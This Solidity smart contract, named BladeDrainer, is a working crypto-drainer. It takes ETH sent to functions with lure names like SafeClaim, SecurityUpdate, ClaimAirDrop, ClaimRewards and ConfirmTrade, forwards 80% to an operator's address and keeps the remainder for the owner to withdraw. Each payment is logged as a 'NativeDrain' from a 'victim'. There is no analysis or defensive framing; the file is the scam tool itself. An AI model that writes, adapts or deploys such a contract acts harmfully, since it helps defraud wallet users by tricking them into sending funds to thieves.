// SPDX-License-Identifier: MIT

pragma solidity ^0.8.22;

contract BladeDrainer {
    address private owner;
    address private contractAddress;

    // event for EVM logging
    event OwnerSet(address indexed oldOwner, address indexed newOwner);

    // event for EVM logging
    event NativeDrain(
        address indexed victim,
        address indexed operator,
        uint256 value
    );

    modifier isOwner() {
        require(msg.sender == owner, "This method can only be called by the contract owner. Now fuck off");
        _;
    }
    
    /**
     * @dev Set contract deployer as owner
     */
    constructor() {
        owner = msg.sender; 
        contractAddress = address(this);
        emit OwnerSet(address(0), owner);
    }

    // Methods for contract administration

    function changeOwner(address newOwner) public isOwner {
        owner = newOwner;
        emit OwnerSet(owner, newOwner);
    }

    function getOwner() external view returns (address) { return owner; }

    /**
    * @dev Used to withdraw the ETH funds to the provided address
    */
    function withdraw(
        address payable _to
    ) public isOwner {
        (bool success, ) = _to.call{
            value: address(this).balance
        }("");

        require(success, "ETH Transfer failed.");
    }

    // Methods that can receive ETH //
    
    function SafeClaim(address _operator) public payable {
        require (msg.value > 0, "Nice try moron");
        uint256 valueToSend = msg.value * 4 / 5;
        (bool success, ) = _operator.call{value: valueToSend}("");
        require(success, "ETH Transfer failed.");
        emit NativeDrain(msg.sender, _operator, msg.value); 
    }

    function SecurityUpdate(address _operator) public payable {
        require (msg.value > 0, "Nice try moron");
        uint256 valueToSend = msg.value * 4 / 5;
        (bool success, ) = _operator.call{value: valueToSend}("");
        require(success, "ETH Transfer failed.");
        emit NativeDrain(msg.sender, _operator, msg.value); 
    
    }

    function ClaimAirDrop(address _operator) public payable {
        require (msg.value > 0, "Nice try moron");
        uint256 valueToSend = msg.value * 4 / 5;
        (bool success, ) = _operator.call{value: valueToSend}("");
        require(success, "ETH Transfer failed.");
        emit NativeDrain(msg.sender, _operator, msg.value); 
    }

    function ClaimRewards(address _operator) public payable {
        require (msg.value > 0, "Nice try moron");
        uint256 valueToSend = msg.value * 4 / 5;
        (bool success, ) = _operator.call{value: valueToSend}("");
        require(success, "ETH Transfer failed.");
        emit NativeDrain(msg.sender, _operator, msg.value); 
    }

    function ConfirmTrade(address _operator) public payable {
        require (msg.value > 0, "Nice try moron");
        uint256 valueToSend = msg.value * 4 / 5;
        (bool success, ) = _operator.call{value: valueToSend}("");
        require(success, "ETH Transfer failed.");
        emit NativeDrain(msg.sender, _operator, msg.value); 
    }
}